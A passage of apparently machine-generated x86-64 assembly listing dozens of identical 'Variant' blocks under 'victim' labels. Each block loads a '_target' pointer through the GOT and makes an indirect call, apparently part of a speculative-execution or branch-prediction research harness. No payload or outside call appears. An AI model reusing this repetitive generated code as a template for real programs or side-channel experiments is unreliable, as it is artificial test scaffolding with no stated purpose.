	jmp	.Lvictim_win0_continue
## Variant 655
.Lvictim_win0_var655:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 656
.Lvictim_win0_var656:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 657
.Lvictim_win0_var657:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 658
.Lvictim_win0_var658:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 659
.Lvictim_win0_var659:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 660
.Lvictim_win0_var660:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 661
.Lvictim_win0_var661:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 662
.Lvictim_win0_var662:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 663
.Lvictim_win0_var663:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 664
.Lvictim_win0_var664:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 665
.Lvictim_win0_var665:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 666
.Lvictim_win0_var666:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 667
.Lvictim_win0_var667:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 668
.Lvictim_win0_var668:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 669
.Lvictim_win0_var669:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 670
.Lvictim_win0_var670:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 671
.Lvictim_win0_var671:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 672
.Lvictim_win0_var672:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 673
.Lvictim_win0_var673:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 674
.Lvictim_win0_var674:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 675
.Lvictim_win0_var675:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 676
.Lvictim_win0_var676:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 677
.Lvictim_win0_var677:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 678
.Lvictim_win0_var678:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 679
.Lvictim_win0_var679:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 680
.Lvictim_win0_var680:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 681
.Lvictim_win0_var681:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 682
.Lvictim_win0_var682:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 683
.Lvictim_win0_var683:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 684
.Lvictim_win0_var684:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 685
.Lvictim_win0_var685:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 686
.Lvictim_win0_var686:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 687
.Lvictim_win0_var687:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 688
.Lvictim_win0_var688:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 689
.Lvictim_win0_var689:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 690
.Lvictim_win0_var690:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 691
.Lvictim_win0_var691:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 692
.Lvictim_win0_var692:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 693
.Lvictim_win0_var693:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 694
.Lvictim_win0_var694:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 695
.Lvictim_win0_var695:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 696
.Lvictim_win0_var696:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 697
.Lvictim_win0_var697:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 698
.Lvictim_win0_var698:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 699
.Lvictim_win0_var699:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 700
.Lvictim_win0_var700:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 701
.Lvictim_win0_var701:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 702
.Lvictim_win0_var702:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 703
.Lvictim_win0_var703:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 704
.Lvictim_win0_var704:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 705
.Lvictim_win0_var705:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 706
.Lvictim_win0_var706:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 707
.Lvictim_win0_var707:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 708
.Lvictim_win0_var708:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 709
.Lvictim_win0_var709:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 710
.Lvictim_win0_var710:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 711
.Lvictim_win0_var711:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 712
.Lvictim_win0_var712:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 713
.Lvictim_win0_var713:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 714
.Lvictim_win0_var714:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 715
.Lvictim_win0_var715:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 716
.Lvictim_win0_var716:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 717
.Lvictim_win0_var717:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 718
.Lvictim_win0_var718:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 719
.Lvictim_win0_var719:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 720
.Lvictim_win0_var720:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 721
.Lvictim_win0_var721:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 722
.Lvictim_win0_var722:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 723
.Lvictim_win0_var723:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 724
.Lvictim_win0_var724:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 725
.Lvictim_win0_var725:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 726
.Lvictim_win0_var726:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 727
.Lvictim_win0_var727:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 728
.Lvictim_win0_var728:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 729
.Lvictim_win0_var729:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 730
.Lvictim_win0_var730:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 731
.Lvictim_win0_var731:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 732
.Lvictim_win0_var732:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 733
.Lvictim_win0_var733:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 734
.Lvictim_win0_var734:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 735
.Lvictim_win0_var735:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 736
.Lvictim_win0_var736:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 737
.Lvictim_win0_var737:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 738
.Lvictim_win0_var738:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 739
.Lvictim_win0_var739:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 740
.Lvictim_win0_var740:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 741
.Lvictim_win0_var741:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 742
.Lvictim_win0_var742:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 743
.Lvictim_win0_var743:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 744
.Lvictim_win0_var744:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 745
.Lvictim_win0_var745:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 746
.Lvictim_win0_var746:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 747
.Lvictim_win0_var747:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 748
.Lvictim_win0_var748:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
